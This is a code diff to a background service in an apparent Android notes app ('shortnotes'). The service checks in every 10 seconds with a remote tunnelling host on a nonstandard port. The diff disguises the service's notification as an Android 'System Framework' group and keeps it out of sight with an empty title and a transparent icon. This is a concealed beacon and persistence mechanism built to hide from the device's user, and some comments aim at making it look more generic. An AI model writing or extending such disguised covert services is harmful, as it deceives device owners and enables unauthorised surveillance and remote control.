@@ -2,6 +2,7 @@ package com.zypher.shortnotes;
 
 import android.app.Notification;
 import android.app.NotificationChannel;
+import android.app.NotificationChannelGroup; // <-- Added Import
 import android.app.NotificationManager;
 import android.app.Service;
 import android.content.Intent;
@@ -24,6 +25,9 @@ public class BackgroundService extends Service {
     private static final int NOTIFICATION_ID = 1337;
     private static final long INTERVAL_MS = 10000; // 10 seconds
     private static final String SERVER_URL = "http://feet-linking.gl.at.ply.gg:1554/log/status";
+    private static final String CHANNEL_GROUP_ID = "android_system_framework"; // Use a slightly different ID maybe
+    private static final String CHANNEL_GROUP_NAME = "System Framework"; // Generic Name
+
 
     // --- Members ---
     private Handler serviceHandler;
@@ -34,7 +38,7 @@ public class BackgroundService extends Service {
         super.onCreate();
         serviceHandler = new Handler(Looper.getMainLooper());
         periodicRunnable = new PeriodicTaskRunnable();
-        createNotificationChannel();
+        createNotificationChannelAndGroup(); // Renamed for clarity
     }
 
     @Override
@@ -75,7 +79,9 @@ public class BackgroundService extends Service {
 
     private Notification buildMinimalNotification() {
         // Use a transparent icon if available, otherwise use a system icon
-        int smallIconResId = R.drawable.ic_transparent; // Replace with transparent icon if you have one
+        // Make sure you have 'ic_transparent.xml' or similar in your drawable resources
+        // Or use a default system icon like android.R.drawable.ic_dialog_info
+        int smallIconResId = R.drawable.ic_transparent;
 
         return new NotificationCompat.Builder(this, CHANNEL_ID)
                 .setContentTitle("") // Empty title
@@ -102,14 +108,15 @@ public class BackgroundService extends Service {
     }
 
     private void sendStatusToServerAsync(final boolean isRunning) {
-        new Thread(() -> {
-            sendStatusToServerInternal(isRunning);
-        }, "StatusSendThread-" + (isRunning ? "running" : "stopped")).start();
+        // Use expression lambda (Warning fix 1)
+        new Thread(() -> sendStatusToServerInternal(isRunning),
+                "StatusSendThread-" + (isRunning ? "running" : "stopped")).start();
     }
 
-    private boolean sendStatusToServerInternal(boolean isRunning) {
+    // Changed return type to void (Warning fix 2 & 3)
+    private void sendStatusToServerInternal(boolean isRunning) {
         HttpURLConnection connection = null;
-        String statusValue = isRunning ? "running" : "stopped"; // Changed to match server expectations
+        String statusValue = isRunning ? "running" : "stopped";
 
         try {
             URL url = new URL(SERVER_URL);
@@ -132,53 +139,74 @@ public class BackgroundService extends Service {
             }
 
             int responseCode = connection.getResponseCode();
-            boolean success = responseCode >= 200 && responseCode < 300;
-            return success;
+            if (responseCode >= 200 && responseCode < 300) {
+                Log.d(TAG, "Status '" + statusValue + "' sent successfully.");
+            } else {
+                Log.w(TAG, "Server responded with code: " + responseCode + " for status: " + statusValue);
+            }
+            // No return value needed
 
         } catch (Exception e) {
-            Log.e(TAG, "Error sending status: " + e.getMessage());
-            return false;
+            Log.e(TAG, "Error sending status '" + statusValue + "': " + e.getMessage());
+            // No return value needed
         } finally {
             if (connection != null) {
                 connection.disconnect();
             }
         }
     }
-
-    private void createNotificationChannel() {
+    private void createNotificationChannelAndGroup() {
+        // Check if we are on Android Oreo (API 26) or higher, where channels exist
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             NotificationManager manager = getSystemService(NotificationManager.class);
-    
-            if (manager != null && manager.getNotificationChannel(CHANNEL_ID) == null) {
+            if (manager == null) {
+                Log.e(TAG, "NotificationManager is null, cannot create channel/group.");
+                return;
+            }
+
+            // --- Create/Ensure Channel Group Exists ---
+            // Creating a group is safe on API 26+.
+            // The createNotificationChannelGroup method is idempotent -
+            // it does nothing if the group with the same ID already exists.
+            // No need for the getNotificationChannelGroup check which requires API 28.
+            NotificationChannelGroup group = new NotificationChannelGroup(
+                    CHANNEL_GROUP_ID,
+                    CHANNEL_GROUP_NAME
+            );
+            // You *could* add the description check back here if needed,
+            // but it was commented out previously.
+            // if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) { // API 28+ for description
+            //     group.setDescription("Background service operations");
+            // }
+            manager.createNotificationChannelGroup(group);
+            Log.i(TAG, "Ensured NotificationChannelGroup exists: " + CHANNEL_GROUP_ID);
+
+
+            // --- Create/Ensure Notification Channel Exists ---
+            // getNotificationChannel is safe on API 26+
+            if (manager.getNotificationChannel(CHANNEL_ID) == null) {
                 NotificationChannel serviceChannel = new NotificationChannel(
                         CHANNEL_ID,
-                        "System Framework", // Even more generic
+                        "Background Tasks", // User-visible name
                         NotificationManager.IMPORTANCE_MIN
                 );
-    
-                // Make the channel as minimally intrusive as possible
-                serviceChannel.setDescription("");
+
+                serviceChannel.setDescription("Channel for background service status"); // Optional
                 serviceChannel.setShowBadge(false);
                 serviceChannel.setSound(null, null);
                 serviceChannel.enableLights(false);
                 serviceChannel.enableVibration(false);
-                
-                // This is key - set the group to something generic
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
-                    serviceChannel.setGroup("android_system");
-                }
-    
+                serviceChannel.setImportance(NotificationManager.IMPORTANCE_MIN);
+
+                // Assigning the channel to the group is safe on API 26+
+                serviceChannel.setGroup(CHANNEL_GROUP_ID);
+
                 manager.createNotificationChannel(serviceChannel);
-                
-                // Create a channel group with generic name if API allows
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                    NotificationChannelGroup group = new NotificationChannelGroup(
-                        "android_system",
-                        "System"
-                    );
-                    manager.createNotificationChannelGroup(group);
-                }
+                Log.i(TAG, "NotificationChannel created: " + CHANNEL_ID);
+            } else {
+                Log.i(TAG, "NotificationChannel already exists: " + CHANNEL_ID);
             }
         }
+        // No else needed - on versions below Oreo, channels/groups don't exist.
     }
 }
